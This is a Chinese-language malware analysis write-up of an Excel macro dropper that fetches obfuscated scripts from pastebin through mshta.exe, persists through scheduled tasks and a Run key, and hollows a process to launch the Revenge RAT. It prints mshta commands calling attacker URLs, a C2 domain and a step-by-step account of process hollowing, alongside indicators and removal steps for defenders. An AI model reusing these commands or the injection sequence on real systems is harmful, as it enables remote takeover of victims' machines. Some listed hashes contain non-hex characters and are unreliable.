**作者: Yenn_  
原文链接: [Wei's
Blog](https://www.weisblog.club/2020/03/24/xls%E5%AE%8F%E7%97%85%E6%AF%92%EF%BC%8C%E7%A8%8B%E5%BA%8F%E4%B8%8D%E8%90%BD%E5%9C%B0%E5%88%9B%E5%BB%BA%E5%82%80%E5%84%A1%E8%BF%9B%E7%A8%8B%E5%AE%9E%E7%8E%B0%E8%BF%9C%E6%8E%A7/#%E7%BB%93%E6%9D%9F%E8%BF%9B%E7%A8%8B)**

# **基本信息**

FileName | FileSize | FileType | MD5  
---|---|---|---  
Order_679873892xls | 47，4722 Byte | Rat | 7641fef8abc7cb24b66655d11ef3daf2  
  
## **简介**

病毒是一个宏病毒，点击启用宏后会通过mshta.exe来访问url，得到要执行的代码，病毒会创建计划任务与设置开机自启，通过powershell执行代码，从url得到两段PE数据，通过宏加载第一个PE文件，然后通过第一个PE文件创建傀儡进程，傀儡进程是一个远控

## **流程图**

[![img](https://images.seebug.org/content/images/2021/03/17/1615973405000-1omqmo.png-w331s)](https://attach.52pojie.cn/forum/201909/24/094702e6hzd83d5b599z3u.png)

# **详细分析**

## **解密**

病毒会调用mshta.exe <http://bit.ly/8hsshjahassahsh> 打开网站后，发现是空白，在浏览器F12，查看网络请求，刷新页面

![](https://images.seebug.org/content/images/2021/03/2ca2889e-784f-4aaf-aa6b-afe6613eb908.png-w331s)

往下滑，找到script代码，复制出来，复制到浏览器的console

[![img](https://images.seebug.org/content/images/2021/03/17/1615973487000-3inmim.png-w331s)](https://attach.52pojie.cn/forum/201909/21/210104w9b2khr1rpvsazro.png)

去掉结尾的,把unscape之前的内容改为console.log(，输出解密结果

[![img](https://images.seebug.org/content/images/2021/03/17/1615973487000-4ociot.png-w331s)](https://attach.52pojie.cn/forum/201909/21/210106is8ovggsx4vcon4n.png)

StrReverse作用是使字符串反序，整理一下

[![img](https://images.seebug.org/content/images/2021/03/17/1615973487000-5sowds.png-w331s)](https://attach.52pojie.cn/forum/201909/21/210108hc0y90eydyyipfpy.png)

最后会执行命令 WScript.Shell.RUN mshta <http://www.pastebin.com/raw/nv5d9pYu>
访问这个url后会发现这个页面已经挂了，但是在ANYRUN有人跑过这个样本，可以看见传回的参数

[![img](https://images.seebug.org/content/images/2021/03/17/1615973487000-6enshc.png-w331s)](https://attach.52pojie.cn/forum/201909/21/210158ravbgm9babe5bee6.png)

同样的方法在console跑一遍，然后整理一下

[![img](https://images.seebug.org/content/images/2021/03/17/1615973487000-7rtafl.png-w331s)](https://attach.52pojie.cn/forum/201909/21/210200vzjsj0x4owj33gg3.png)

## **结束进程**

第一段代码，调用CMD关闭进程winword.exe、excel.exe、MSPUB.exe、POWERPNT.exe

[![img](https://images.seebug.org/content/images/2021/03/17/1615973488000-8mgcgq.png-w331s)](https://attach.52pojie.cn/forum/201909/21/210227kh1w0h0vp6vy210w.png)

## **创建计划任务**

第二段代码，创建一个计划任务，名为Windows Update，每60分钟执行一次，执行的内容是
mshta.exe<http://pastebin.com/raw/vXpe74L2>

[![img](https://images.seebug.org/content/images/2021/03/17/1615973488000-9vspfa.png-w331s)](https://attach.52pojie.cn/forum/201909/21/210245njxd4n49j9ichxo4.png)

## **解密计划任务执行的内容**

在浏览器打开url后，全都是混淆的代码

[![img](https://images.seebug.org/content/images/2021/03/17/1615973488000-10badtu.png-w331s)](https://attach.52pojie.cn/forum/201909/21/210351uw36ow3wkyyhky44.png)

用一样的方法在Console里面用Console.log输出出来

[![img](https://images.seebug.org/content/images/2021/03/17/1615973488000-11zhntr.png-w331s)](https://attach.52pojie.cn/forum/201909/21/210353og4npdwdr5onwlsg.png)

复制到notepad++，看见代码最下面有个replace

[![img](https://images.seebug.org/content/images/2021/03/17/1615973488000-12kxesa.png-w331s)](https://attach.52pojie.cn/forum/201909/21/210355ijsij25t1shry18e.png)

按Ctrl+H将中间的字符串替换掉

[![img](https://images.seebug.org/content/images/2021/03/17/1615973488000-13icpoo.png-w331s)](https://attach.52pojie.cn/forum/201909/21/210357qsmyfywwss8arq1m.png)

得到两个字符串，用StrReverse函数将字符串反过来，最后是用powershell执行这段代码

[![img](https://images.seebug.org/content/images/2021/03/17/1615973488000-14httrw.png-w331s)](https://attach.52pojie.cn/forum/201909/21/210400jkpp77lxiaall17a.png)

代码解密出来为

[![img](https://images.seebug.org/content/images/2021/03/17/1615973489000-15vjyrg.png-w331s)](https://attach.52pojie.cn/forum/201909/21/210402jzblfdewvn6w6wdn.png)

利用powershell执行，第三行的代码来自url <https://pastebin.com/raw/wMG90xwi>

[![img](https://images.seebug.org/content/images/2021/03/17/1615973489000-16zwrco.png-w331s)](https://attach.52pojie.cn/forum/201909/21/210454ckgoyinltxhz14gn.png)

经过解密后：得到一个MZ头的PE数据

[![img](https://images.seebug.org/content/images/2021/03/17/1615973489000-17amujy.png-w331s)](https://attach.52pojie.cn/forum/201909/21/210456vvjervjsv6n7vg7u.png)

第四行的代码url为 <https://pastebin.com/raw/W455MkAZ>

[![img](https://images.seebug.org/content/images/2021/03/17/1615973489000-18dffqv.png-w331s)](https://attach.52pojie.cn/forum/201909/21/210535cr0sr0rpaz0gqkbs.png)

经过解密后，也可以得到MZ开头的数据

[![img](https://images.seebug.org/content/images/2021/03/17/1615973489000-19jldvc.png-w331s)](https://attach.52pojie.cn/forum/201909/21/210537ibumuzabzuyumurw.png)

## **给创建傀儡进程传参**

这里先创建一个实例，类和方法都来自第一段数据dll中，然后传入两个参数，第一个是创建的进程名“MSBuiler.exe”，第二个参数是第二段获取的PE结构数据

[![img](https://images.seebug.org/content/images/2021/03/17/1615973489000-20bxisz.png-w331s)](https://attach.52pojie.cn/forum/201909/23/113148ujdjeot3zaed0036.png)

调用powershell，执行上面代码

[![img](https://images.seebug.org/content/images/2021/03/17/1615973489000-21bdxci.png-w331s)](https://attach.52pojie.cn/forum/201909/21/210606btt6hvpgrhgtz39a.png)

第二段代码内容：

[![img](https://images.seebug.org/content/images/2021/03/17/1615973489000-22rxysf.png-w331s)](https://attach.52pojie.cn/forum/201909/21/210608ejgrbjubo1ca1qua.png)

## **创建计划任务**

访问 <http://pastebin.com/raw//JdTuFmc5> 获得要执行的代码

[![img](https://images.seebug.org/content/images/2021/03/17/1615973490000-23uyfxa.png-w331s)](https://attach.52pojie.cn/forum/201909/21/210843poebii2iivg77ihi.png)

和前面一样，改成console.log

[![img](https://images.seebug.org/content/images/2021/03/17/1615973490000-24cnrcg.png-w331s)](https://attach.52pojie.cn/forum/201909/21/210845fh8xmfapqtxzhga6.png)

解密之后，发现与上一段代码相同，只是计划任务时间从60分钟运行一次，变成了300分钟运行一次

## **修改注册表**

第四段代码修改注册表，内容是<http://pastebin.com/raw/CGe3S2Vf>取回的内容

[![img](https://images.seebug.org/content/images/2021/03/17/1615973490000-25ojgkz.png-w331s)](https://attach.52pojie.cn/forum/201909/21/210920s11mu35a3e8l9au3.png)

[![img](https://images.seebug.org/content/images/2021/03/17/1615973490000-26gqxkw.png-w331s)](https://attach.52pojie.cn/forum/201909/21/210923w9bx6l66k7abbdg4.png)

一样，放进console里面，改成console.log,解密出的代码如图

[![img](https://images.seebug.org/content/images/2021/03/17/1615973491000-27onqsu.png-w331s)](https://attach.52pojie.cn/forum/201909/21/210925u95ggd9gozqonw4q.png)

最后还是和前两段一样的内容，在注册表自启动中写入，利用Powershell执行代码

[![img](https://images.seebug.org/content/images/2021/03/17/1615973491000-28vbxvd.png-w331s)](https://attach.52pojie.cn/forum/201909/21/210927s25wdq6hw54vd6wq.png)

## **反混淆**

通过前面MSBuilder.exe编译可以得到两个PE文件，一个DLL，一个EXE，都是用.net编译，都可用de4dot反混淆

[![img](https://images.seebug.org/content/images/2021/03/17/1615973491000-29footy.png-w331s)](https://attach.52pojie.cn/forum/201909/21/211043g0oai3m02m6if901.png)

反混淆后使用dnSpy查看dll文件，发现其中还是有很多混淆，是ConfuerEX，用工具解一下ConfuerEX混淆 解混淆之前：

[![img](https://images.seebug.org/content/images/2021/03/17/1615973491000-30fjymt.png-w331s)](https://attach.52pojie.cn/forum/201909/21/211103rg2sasdglg0x2usx.png)

解混淆之后：

[![img](https://images.seebug.org/content/images/2021/03/17/1615973492000-31wlsyv.png-w331s)](https://attach.52pojie.cn/forum/201909/21/211105yqet7stee4jj9xbx.png)

在JS代码最后，会调用.dll中的类和方法

[![img](https://images.seebug.org/content/images/2021/03/17/1615973492000-32kupas.png-w331s)](https://attach.52pojie.cn/forum/201909/21/211126gl3c2gevlhllwcpv.png)

[![img](https://images.seebug.org/content/images/2021/03/17/1615973492000-33zvbms.png-w331s)](https://attach.52pojie.cn/forum/201909/21/211145bbdawdwuddcue8ba.png)

## **创建傀儡进程**

在Dodo函数传入两个参数，第一个是JS代码中写的MSBuilder,第二个是JS代码中的$f,就是前面解密出的exe文件

[![img](https://images.seebug.org/content/images/2021/03/17/1615973492000-34xvril.png-w331s)](https://attach.52pojie.cn/forum/201909/21/211208tfaqf6wmxqafaqd6.png)

在五个目录下查找MSBuilder.exe

[![img](https://images.seebug.org/content/images/2021/03/17/1615973492000-35yqint.png-w331s)](https://attach.52pojie.cn/forum/201909/21/211210nvr7770x7fjxmmy7.png)

当查找到MSBuilder后，就执行下面的代码

[![img](https://images.seebug.org/content/images/2021/03/17/1615973492000-36imznn.png-w331s)](https://attach.52pojie.cn/forum/201909/21/211305qurbumg730rg7mms.png)

这个地方调用了tickleme函数，tickleme函数又调用了PEHeaderE和FUN函数

[![img](https://images.seebug.org/content/images/2021/03/17/1615973492000-37mnhzk.png-w331s)](https://attach.52pojie.cn/forum/201909/21/211307u4zuvbu0hypeygvd.png)

PEHeaderE函数：

[![img](https://images.seebug.org/content/images/2021/03/17/1615973493000-38bjkww.png-w331s)](https://attach.52pojie.cn/forum/201909/21/211347ox6awhanf1aedlaa.png)

FUN函数里又调用了Smethod_0函数，传入的第一个参数是MSBuidler.exe第二个参数是exe的十六进制数据

[![img](https://images.seebug.org/content/images/2021/03/17/1615973493000-39fqqfi.png-w331s)](https://attach.52pojie.cn/forum/201909/21/211349r08118u0i63x6w60.png)

Smethod_0函数，先创建了一个MSBuilder的进程

[![img](https://images.seebug.org/content/images/2021/03/17/1615973493000-40owjpu.png-w331s)](https://attach.52pojie.cn/forum/201909/21/211351eeqp1n4kumhlewue.png)

获取到EXE的PE头和ImageBase

[![img](https://images.seebug.org/content/images/2021/03/17/1615973493000-41ycwkr.png-w331s)](https://attach.52pojie.cn/forum/201909/21/211353xdp9dddvi9zdc9i1.png)

判断是32位系统或64位系统，调用获取线程上下文函数

[![img](https://images.seebug.org/content/images/2021/03/17/1615973493000-42cfvzd.png-w331s)](https://attach.52pojie.cn/forum/201909/21/211444qhmzmh2eegfm0heh.png)

从内存中读取4字节数据，然后卸载映像，清空内存，方便后面注入

[![img](https://images.seebug.org/content/images/2021/03/17/1615973493000-43xqjoa.png-w331s)](https://attach.52pojie.cn/forum/201909/21/211446c3i7yzi11133unpn.png)

得到exe ImageBase的大小然后申请对应大小的空间

[![img](https://images.seebug.org/content/images/2021/03/17/1615973493000-44oeszu.png-w331s)](https://attach.52pojie.cn/forum/201909/21/211448jlye0doqhaeen79m.png)

在申请的空间中写入exe的header

[![img](https://images.seebug.org/content/images/2021/03/17/1615973493000-45edyav.png-w331s)](https://attach.52pojie.cn/forum/201909/21/211519efwn8f8w2v9ev9ff.png)

然后获取到节表，遍历写入节表的所有节

[![img](https://images.seebug.org/content/images/2021/03/17/1615973493000-46xsekj.png-w331s)](https://attach.52pojie.cn/forum/201909/21/211521y6z9598js497tiut.png)

[![img](https://images.seebug.org/content/images/2021/03/17/1615973494000-47qjdpa.png-w331s)](https://attach.52pojie.cn/forum/201909/21/211523d6ujdxy2xshsxcqj.png)

将前面获取到的线程上下文放回，然后唤醒线程，完成创建傀儡进程，执行exe里的内容

[![img](https://images.seebug.org/content/images/2021/03/17/1615973494000-48rnxvg.png-w331s)](https://attach.52pojie.cn/forum/201909/21/211551yotcf4a6prp466w4.png)

## **EXE**

exe中可以看见C2服务器信息、互斥量、ID等信息

[![img](https://images.seebug.org/content/images/2021/03/17/1615973494000-49yaycm.png-w331s)](https://attach.52pojie.cn/forum/201909/21/211620wnbzb5iyzi5zysfx.png)

进来先找到main函数

[![img](https://images.seebug.org/content/images/2021/03/17/1615973494000-50qeciv.png-w331s)](https://attach.52pojie.cn/forum/201909/23/100920ctmwmsamkuxuutsn.png)

.SCG就是new的自己，然后再调用Execute()函数，Execute函数内分别是This.SC、This.PT、This.INST三个函数，每个函数创建了一共线程，执行不同的代码

[![img](https://images.seebug.org/content/images/2021/03/17/1615973494000-51auton.png-w331s)](https://attach.52pojie.cn/forum/201909/23/100922e311mk2nj3m4muj0.png)

[![img](https://images.seebug.org/content/images/2021/03/17/1615973494000-52fggmx.png-w331s)](https://attach.52pojie.cn/forum/201909/23/100924rq012nhne3kk1f0w.png)

其中包含有对C2服务器的TCP链接

[![img](https://images.seebug.org/content/images/2021/03/17/1615973494000-53gbcig.png-w331s)](https://attach.52pojie.cn/forum/201909/23/100926qd337ci6js76lys2.png)

获得主机各种信息包括病毒ID、IP、主机名、系统信息、内存、杀软信息等，并用key值（lunlaylo）做分隔符，然后发送到服务器

[![img](https://images.seebug.org/content/images/2021/03/17/1615973494000-54oxwvb.png-w331s)](https://attach.52pojie.cn/forum/201909/23/100928w4oquz4m118q8x8z.png)

谷歌了一下互斥量“RV_MUTEX-WindowsUpdateSysten32”，发现是一个成熟的远控，名叫” Revenge Rat”。

# **样本溯源**

File Name | MD5  
---|---  
Order_679873892xls | 7641fef8abc7cb24b66655d11ef3daf2  
.dll | d1726dc5808c22be63507e06bbdc087  
.exe | esd785a808f7272fb79E33a66570d844  
C2： | meandmyjoggar.duckdns.org  
---|---  
URL： | <http://www.pastebin.com/raw/nv5d9pYu>  
| <http://pastebin.com/raw/vXpe74L2>  
| <https://pastebin.com/raw/W455MkAZ>  
| <http://pastebin.com/raw//JdTuFmc5>  
| <http://pastebin.com/raw/CGe3S2Vf>  
MUTEX： | RV_MUTEX-WindowsUpdateSysten32  
  
# **查杀方案**

删除注册表HKCU\Software\Microsoft\Windows\CurrentVersion\Run\AvastUpdate
删除名为Windows Update和Update的调用mshta.exe的计划任务 结束进程“MSBuilder.exe

# **总结**

病毒使用excel中的宏执行代码，执行的代码都是从url中获取然后解密出来得到，添加的自启动或计划任务也没有程序落地，每次运行都从url得到数据创建一个傀儡进程实现远控。

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1514/>

